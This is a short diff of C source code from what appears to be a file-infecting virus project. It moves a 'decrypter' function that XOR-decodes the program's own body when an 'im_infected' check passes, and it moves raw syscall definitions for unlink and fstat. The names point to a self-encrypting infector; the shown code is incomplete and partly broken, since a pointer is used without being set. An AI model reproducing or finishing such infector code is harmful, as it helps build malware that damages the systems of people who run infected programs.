@@ -232,8 +232,7 @@ bool process_runing(void)
 	}
 	return (0);
 }
-__syscall1(int, unlink, const char *, pathname);
-__syscall2(int, fstat, int, fildes, struct stat * , buf);
+
 
 
 void	ft_putnbr(int nb)
@@ -360,7 +359,25 @@ int             ft_strcmp(const char *s1, const char *s2)
 	}
 	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
 }
+void decrypter(unsigned long address_of_main)
+{
+	size_t	size;
+	size_t	offset;
+	char	*start;
 
+	offset = *(int *)(address_of_main - 4 + sizeof(offset));
+	size = *(int *)(address_of_main - 4);
+	if(size && im_infected(address_of_main))
+	{
+		start[offset] ^= *(int *)(address_of_main - 4);
+		offset++;
+		while (offset < size)
+		{
+			start[offset] ^= start[offset - 1];
+			offset++;
+		}
+	}
+}
 
 int main_encrypt()
 {
@@ -400,27 +417,10 @@ int main_encrypt()
 	write(1,"content: ",9);
 	write(1,path_env,ft_strlen(path_env));
 }
+__syscall1(int, unlink, const char *, pathname);
+__syscall2(int, fstat, int, fildes, struct stat * , buf);
 
 
- void decrypter(unsigned long address_of_main)
-{
-	size_t	size;
-	size_t	offset;
-	char	*start;
-
-	offset = *(int *)(address_of_main - 4 + sizeof(offset));
-	size = *(int *)(address_of_main - 4);
-	if(size && im_infected(address_of_main))
-	{
-		start[offset] ^= *(int *)(address_of_main - 4);
-		offset++;
-		while (offset < size)
-		{
-			start[offset] ^= start[offset - 1];
-			offset++;
-		}
-	}
-}
  int get_env_var(char *name, char *content, int content_size)
 {
 	char buf[4];
